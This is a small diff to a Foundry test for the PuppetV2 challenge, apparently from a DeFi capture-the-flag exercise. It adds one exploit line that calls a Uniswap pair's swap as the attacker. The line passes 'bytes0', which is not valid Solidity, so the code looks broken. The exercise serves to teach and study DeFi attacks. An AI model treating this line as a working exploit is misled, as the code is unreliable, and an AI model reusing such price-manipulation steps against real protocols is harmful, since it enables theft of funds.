@@ -122,6 +122,7 @@ contract PuppetV2 is Test {
         console.log(bait / 1 ether);
         vm.startPrank(attacker);
         dvt.approve(address(uniswapV2Pair), type(uint256).max);
+        uniswapV2Pair.swap(ATTACKER_INITIAL_TOKEN_BALANCE, ATTACKER_INITIAL_ETH_BALANCE, address(attacker), bytes0);
         vm.stopPrank();
         /** EXPLOIT END **/
         validation();
